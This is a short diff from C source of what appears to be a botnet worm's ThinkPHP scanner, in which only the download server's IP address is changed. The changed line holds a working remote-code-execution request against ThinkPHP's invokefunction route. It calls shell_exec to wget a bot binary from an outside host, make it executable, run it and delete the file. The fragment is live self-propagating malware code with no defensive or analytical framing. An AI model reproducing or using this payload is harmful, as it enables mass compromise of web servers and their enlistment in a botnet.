@@ -274,7 +274,7 @@ void thinkphp_scanner(void)
                         printf("[scanner] FD%d sending payload\n", conn->fd);
 #endif
 
-                        util_strcpy(conn->payload_buf, "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://104.36.19.220/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: /\r\nUser-Agent: Uirusu/2.0\r\n\r\n");
+                        util_strcpy(conn->payload_buf, "GET /index.php?s=/index/\think\app/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://35.199.103.40/bins/x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1\r\nConnection: keep-alive\r\nAccept-Encoding: gzip, deflate\r\nAccept: /\r\nUser-Agent: Uirusu/2.0\r\n\r\n");
                         send(conn->fd, conn->payload_buf, util_strlen(conn->payload_buf), MSG_NOSIGNAL);
                         util_zero(conn->payload_buf, sizeof(conn->payload_buf));
                         util_zero(conn->rdbuf, sizeof(conn->rdbuf));
